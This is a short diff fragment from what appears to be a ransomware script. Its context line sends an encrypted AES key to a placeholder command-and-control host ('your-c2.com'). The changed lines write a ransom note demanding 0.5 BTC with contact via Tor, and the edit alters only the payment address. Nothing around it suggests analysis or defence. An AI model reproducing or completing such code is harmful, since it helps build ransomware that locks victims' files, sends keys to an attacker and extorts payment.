@@ -28,4 +28,4 @@ requests.post("https://your-c2.com/key", data=enc_aes)
 
 # Ransom note
 with open("READ_ME.txt", "w") as f:
-    f.write("Your files encrypted. Pay 0.5 BTC to X... Contact via Tor.")
+    f.write("Your files encrypted. Pay 0.5 BTC to oX... Contact via Tor.")
